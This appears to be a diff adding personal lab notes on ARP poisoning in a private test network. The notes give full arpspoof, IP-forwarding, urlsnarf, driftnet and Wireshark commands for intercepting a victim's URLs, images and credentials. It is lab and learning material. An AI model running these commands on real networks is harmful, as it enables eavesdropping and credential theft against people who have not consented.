@@ -1,0 +1,68 @@
+MITM: ARP Poisoning
+````````````````````
+Attacker Machine:
+	IP : 192.168.206.131	[ ip -br -c a ]
+	MAC: 91:04:b0		[ ip a // ifconfig eth0]
+Victim Machine: [nmap]
+	IP : 192.168.206.141
+	MAC: 1A:6D:75
+Gateway: [route -n]
+	IP : 192.168.206.2
+	MAC: FC:6A:71  [ nmap -sn 192.168.206.2 ]
+
+Attacker's MAchine:
+````````````````````
+1) Install:
+````````````
+# apt install arpspoof -y
+
+2) ARP Table on Victim's Machine (Before Attack): 
+``````````````````````````````````````````````````
+# arp -an
+? (192.168.206.2) at 00:50:56:fc:6a:71 [ether] on ens37
+? (192.168.206.1) at 00:50:56:c0:00:03 [ether] on ens37
+? (192.168.206.254) at 00:50:56:fa:bf:48 [ether] on ens37
+? (192.168.206.131) at 00:0c:29:91:04:b0 [ether] on ens37
+
+3) Victim to Gateway: Terminal#1
+`````````````````````````````````
+# arpspoof -i eth1 -t 192.168.206.141 192.168.206.2
+
+-i : interface name
+-t : Target Machine
+
+4) Gateway to Victim: Terminal#2
+`````````````````````````````````
+# arpspoof -i eth1 -t 192.168.206.2 192.168.206.141
+
+-i : interface name
+-t : Target Machine
+
+5) Enable IP Forwarding:
+`````````````````````````
+# cat /proc/sys/net/ipv4/ip_forward
+0
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+
+On Victim:
+```````````
+Check the arp table after attack:
+
+# arp -an
+
+On Attacker's Terminal:
+```````````````````````
+1) URL Sniffing:
+
+# urlsnarf -i eth1
+
+
+2) Intercept images:
+`````````````````````` GUI
+
+# driftnet -i eth1
+
+3) Intercept Creds:
+````````````````````
+# wireshark 
+filter: http
